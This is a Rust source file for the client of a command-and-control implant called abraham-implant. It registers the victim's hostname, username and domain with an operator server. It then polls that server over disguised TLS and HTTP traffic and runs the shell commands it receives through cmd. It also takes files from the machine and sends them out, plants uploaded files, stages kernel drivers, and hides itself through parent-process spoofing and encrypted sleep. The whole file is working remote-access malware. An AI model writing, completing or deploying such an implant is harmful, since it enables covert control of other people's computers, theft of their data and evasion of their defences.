use abraham_common::crypto::{self, ClientHello, Session};
use abraham_common::frame::open_frames;
use abraham_common::http::{read_response, write_request};
use abraham_common::message::{
    self, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
};
use abraham_common::profile::Profile;
use ed25519_dalek::VerifyingKey;
use sha2::{Digest, Sha256};
use std::net::IpAddr;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use tokio_rustls::rustls::client::danger::{
    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier,
};
use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use tokio_rustls::rustls::{
    ClientConfig, DigitallySignedStruct, Error as TlsError, SignatureScheme,
};
use tokio_rustls::TlsConnector;

mod driver;
mod evasion;
mod mapper;
mod modules;
mod vdm;

const CHUNK_SIZE: usize = 60_000;
const RECONNECT_SECS: u64 = 5;

fn arg_or(flag: &str, default: &str) -> String {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
        .unwrap_or_else(|| default.to_string())
}

fn arg_opt(flag: &str) -> Option<String> {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
}

fn collect_info() -> RegisterInfo {
    let env = |key: &str| std::env::var(key).unwrap_or_default();
    RegisterInfo {
        hostname: env("COMPUTERNAME"),
        username: env("USERNAME"),
        domain: env("USERDOMAIN"),
        pid: std::process::id(),
        ppid: 0,
        arch: if cfg!(target_arch = "x86_64") {
            message::ARCH_X64
        } else {
            message::ARCH_ARM64
        },
        integrity_level: 1,
        os_build: env("OS"),
        implant_version: env!("CARGO_PKG_VERSION").to_string(),
    }
}

fn jittered(secs: u64, jitter: f32) -> Duration {
    let factor = 1.0 + jitter * (2.0 * rand::random::<f32>() - 1.0);
    let wait = (secs as f32 * factor).max(0.5) as u64;
    Duration::from_secs(wait)
}

/// The outer TLS layer is cover traffic; authenticity comes from the inner
/// Ed25519-pinned handshake. By default any server certificate is accepted.
/// When a pin is configured the end-entity certificate DER must hash to it.
#[derive(Debug)]
struct PinOrAnyVerifier {
    pin: Option<[u8; 32]>,
}

impl ServerCertVerifier for PinOrAnyVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, TlsError> {
        if let Some(expected) = &self.pin {
            let digest: [u8; 32] = Sha256::digest(end_entity.as_ref()).into();
            if digest != *expected {
                return Err(TlsError::General("tls certificate pin mismatch".into()));
            }
        }
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, TlsError> {
        rustls::crypto::verify_tls12_signature(
            message,
            cert,
            dss,
            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
        )
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &CertificateDer<'_>,
        dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, TlsError> {
        rustls::crypto::verify_tls13_signature(
            message,
            cert,
            dss,
            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
        )
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

struct HttpConn<S> {
    stream: S,
    host: String,
    user_agent: String,
}

impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
    async fn post(&mut self, uri: &str, body: Vec<u8>) -> anyhow::Result<Vec<u8>> {
        write_request(
            &mut self.stream,
            "POST",
            uri,
            &self.host,
            &self.user_agent,
            &body,
        )
        .await?;
        let resp = read_response(&mut self.stream).await?;
        if resp.status != 200 {
            anyhow::bail!("server returned http {}", resp.status);
        }
        Ok(resp.body)
    }

    /// Posts one sealed frame and decrypts any frames in the response so the
    /// receive counter stays in lockstep with the server.
    async fn post_frame(
        &mut self,
        uri: &str,
        session: &mut Session,
        msg_type: u8,
        plaintext: &[u8],
    ) -> anyhow::Result<Vec<(u8, Vec<u8>)>> {
        let frame = session.seal(msg_type, plaintext)?;
        let body = self.post(uri, frame).await?;
        Ok(open_frames(&body, session)?)
    }
}

// Single-threaded runtime: sleep obfuscation encrypts the whole image, so
// no other thread may execute implant code while the session thread sleeps.
#[tokio::main(flavor = "current_thread")]
async fn main() -> anyhow::Result<()> {
    let server = arg_or("--server", "127.0.0.1:8443");
    let key_hex = arg_or("--key", "");
    if key_hex.is_empty() {
        anyhow::bail!(
            "usage: abraham-implant --server <addr> --key <hex> [--profile <yaml>] [--ua <ua>] [--uri <uri>] [--sleep <secs>] [--jitter <f32>] [--tls-pin <sha256-hex>] [--evasion ekko,ppid]"
        );
    }
    let mut public_key = [0u8; 32];
    hex::decode_to_slice(key_hex.trim(), &mut public_key)?;
    let identity = VerifyingKey::from_bytes(&public_key)?;

    let mut profile = match arg_opt("--profile") {
        Some(path) => Profile::load_file(Path::new(&path)).map_err(anyhow::Error::msg)?,
        None => Profile::default(),
    };
    if let Some(ua) = arg_opt("--ua") {
        profile.user_agent = ua;
    }
    if let Some(uri) = arg_opt("--uri") {
        profile.uris = vec![uri];
    }
    let mut sleep_secs: u64 = arg_opt("--sleep")
        .map(|v| v.parse())
        .transpose()?
        .unwrap_or(profile.sleep_secs);
    let mut jitter: f32 = arg_opt("--jitter")
        .map(|v| v.parse())
        .transpose()?
        .unwrap_or(profile.jitter);
    let pin = match arg_opt("--tls-pin") {
        Some(text) => {
            let mut pin = [0u8; 32];
            hex::decode_to_slice(text.trim(), &mut pin)?;
            Some(pin)
        }
        None => None,
    };
    let evasion_spec = arg_or("--evasion", "");
    let evasion = if evasion_spec.is_empty() {
        evasion::Evasion::disabled()
    } else {
        let flags = evasion::Flags::parse(&evasion_spec).map_err(anyhow::Error::msg)?;
        let armed = evasion::Evasion::enable(flags).map_err(anyhow::Error::msg)?;
        eprintln!(
            "[*] evasion armed: sleep={} parent-spoof={}",
            flags.ekko_sleep, flags.spoofed_parent
        );
        armed
    };

    loop {
        match run(
            &server,
            &identity,
            &profile,
            pin,
            &evasion,
            &mut sleep_secs,
            &mut jitter,
        )
        .await
        {
            Ok(()) => return Ok(()),
            Err(e) => eprintln!("[!] session ended: {e}; reconnecting in {RECONNECT_SECS}s"),
        }
        tokio::time::sleep(Duration::from_secs(RECONNECT_SECS)).await;
    }
}

async fn run(
    addr: &str,
    identity: &VerifyingKey,
    profile: &Profile,
    pin: Option<[u8; 32]>,
    evasion: &evasion::Evasion,
    sleep_secs: &mut u64,
    jitter: &mut f32,
) -> anyhow::Result<()> {
    let (host, _port) = addr
        .split_once(':')
        .ok_or_else(|| anyhow::anyhow!("server address must be host:port"))?;
    let tcp = TcpStream::connect(addr).await?;
    tcp.set_nodelay(true)?;
    let server_name = match host.parse::<IpAddr>() {
        Ok(ip) => ServerName::IpAddress(ip.into()),
        Err(_) => ServerName::try_from(host.to_string())?,
    };
    let tls_config = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(PinOrAnyVerifier { pin }))
        .with_no_client_auth();
    let connector = TlsConnector::from(Arc::new(tls_config));
    let tls = connector.connect(server_name, tcp).await?;
    let mut conn = HttpConn {
        stream: tls,
        host: host.to_string(),
        user_agent: profile.user_agent.clone(),
    };

    let (client_secret, client_hello) = ClientHello::generate();
    let hello_body = conn
        .post(profile.pick_uri(), client_hello.to_bytes().to_vec())
        .await?;
    let raw_hello: [u8; crypto::SERVER_HELLO_LEN] = hello_body.as_slice().try_into()?;
    let server_hello = crypto::ServerHello::from_bytes(&raw_hello);
    let mut session = crypto::client_finish(identity, client_secret, &client_hello, &server_hello)?;

    let (mt, body) = Message::Register(collect_info()).encode();
    conn.post_frame(profile.pick_uri(), &mut session, mt, &body)
        .await?;

    loop {
        evasion.sleep(jittered(*sleep_secs, *jitter));
        let (mt, body) = Message::TaskPoll.encode();
        let frames = conn
            .post_frame(profile.pick_uri(), &mut session, mt, &body)
            .await?;

        let mut pending_upload: Option<(u32, String, Vec<u8>)> = None;
        for (msg_type, payload) in frames {
            if msg_type == msg::BATCH_END {
                break;
            }
            match Message::decode(msg_type, &payload)? {
                Message::Task(task) => match task.body {
                    TaskBody::Upload { path } => {
                        pending_upload = Some((task.id, path, Vec::new()));
                    }
                    body => {
                        execute_task(
                            &mut conn,
                            &mut session,
                            profile,
                            evasion,
                            Task { id: task.id, body },
                            sleep_secs,
                            jitter,
                        )
                        .await?;
                    }
                },
                Message::Chunk(chunk) => {
                    handle_upload_chunk(
                        &mut conn,
                        &mut session,
                        profile,
                        &mut pending_upload,
                        chunk,
                    )
                    .await?;
                }
                _ => {}
            }
        }
    }
}

async fn send_result<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    result: TaskResult,
) -> anyhow::Result<()> {
    let (mt, body) = Message::TaskResult(result).encode();
    conn.post_frame(profile.pick_uri(), session, mt, &body)
        .await?;
    Ok(())
}

async fn send_chunks<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    task_id: u32,
    data: &[u8],
) -> anyhow::Result<()> {
    let mut body = Vec::new();
    if data.is_empty() {
        let (mt, encoded) = Message::Chunk(Chunk {
            task_id,
            seq: 0,
            data: Vec::new(),
            last: true,
        })
        .encode();
        body.extend_from_slice(&session.seal(mt, &encoded)?);
    } else {
        let total = data.len().div_ceil(CHUNK_SIZE);
        for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
            let (mt, encoded) = Message::Chunk(Chunk {
                task_id,
                seq: seq as u32,
                data: part.to_vec(),
                last: seq + 1 == total,
            })
            .encode();
            body.extend_from_slice(&session.seal(mt, &encoded)?);
        }
    }
    conn.post(profile.pick_uri(), body).await?;
    Ok(())
}

async fn handle_upload_chunk<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    pending: &mut Option<(u32, String, Vec<u8>)>,
    chunk: Chunk,
) -> anyhow::Result<()> {
    let Some((_, _, data)) = pending.as_mut() else {
        return Ok(());
    };
    data.extend_from_slice(&chunk.data);
    if !chunk.last {
        return Ok(());
    }
    let Some((task_id, path, data)) = pending.take() else {
        return Ok(());
    };
    let (status, message) = match std::fs::write(&path, &data) {
        Ok(()) => (
            message::STATUS_OK,
            format!("wrote {} bytes to {path}", data.len()),
        ),
        Err(e) => (
            message::STATUS_ERROR,
            format!("failed to write {path}: {e}"),
        ),
    };
    send_result(
        conn,
        session,
        profile,
        TaskResult {
            id: task_id,
            status,
            data: message.into_bytes(),
        },
    )
    .await
}

async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
    conn: &mut HttpConn<S>,
    session: &mut Session,
    profile: &Profile,
    evasion: &evasion::Evasion,
    task: Task,
    sleep_secs: &mut u64,
    jitter: &mut f32,
) -> anyhow::Result<()> {
    match task.body {
        TaskBody::Shell { command } => {
            let (status, data) = if evasion.spoofed_parent() {
                let (exit, output) = evasion.run_command(&command)?;
                let status = if exit == 0 {
                    message::STATUS_OK
                } else {
                    message::STATUS_ERROR
                };
                (status, output)
            } else {
                // Blocking std::process, deliberately: tokio::process runs
                // on the runtime's background thread pool, and those
                // threads may execute implant code during the ekko
                // encrypted window — the exact single-thread invariant
                // sleep obfuscation relies on (observed as an
                // access violation in the VM lab, 2026-09-11). The
                // session thread blocks here exactly like it already
                // blocks inside evasion.sleep().
                let output = std::process::Command::new("cmd")
                    .args(["/C", &command])
                    .output()?;
                let status = if output.status.success() {
                    message::STATUS_OK
                } else {
                    message::STATUS_ERROR
                };
                let mut data = output.stdout;
                data.extend_from_slice(&output.stderr);
                (status, data)
            };
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data,
                },
            )
            .await
        }
        TaskBody::Module { name, args } => {
            let (status, data) = match modules::run(&name, &args) {
                Ok(data) => (message::STATUS_OK, data),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data,
                },
            )
            .await
        }
        TaskBody::Driver {
            action,
            service,
            source,
            drop_path,
        } => {
            // Blocking SCM lifecycle on the session thread (ABR-T013),
            // same single-thread rationale as the module arm.
            let (status, data) = match driver::stage(action, &service, &source, &drop_path) {
                Ok(data) => (message::STATUS_OK, data),
                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
            };
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status,
                    data,
                },
            )
            .await
        }
        TaskBody::Download { path } => {
            // std::fs for the same single-thread reason as shell tasks:
            // tokio::fs hops to the blocking pool, which must never run
            // implant code mid-ekko-window.
            let data = std::fs::read(&path)?;
            send_chunks(conn, session, profile, task.id, &data).await?;
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: path.into_bytes(),
                },
            )
            .await
        }
        TaskBody::Sleep { secs, jitter: j } => {
            *sleep_secs = secs;
            *jitter = j;
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: format!("sleep updated to {secs}s with jitter {}", j).into_bytes(),
                },
            )
            .await
        }
        TaskBody::Exit => {
            send_result(
                conn,
                session,
                profile,
                TaskResult {
                    id: task.id,
                    status: message::STATUS_OK,
                    data: b"bye".to_vec(),
                },
            )
            .await?;
            std::process::exit(0);
        }
        TaskBody::Upload { .. } => Ok(()),
    }
}
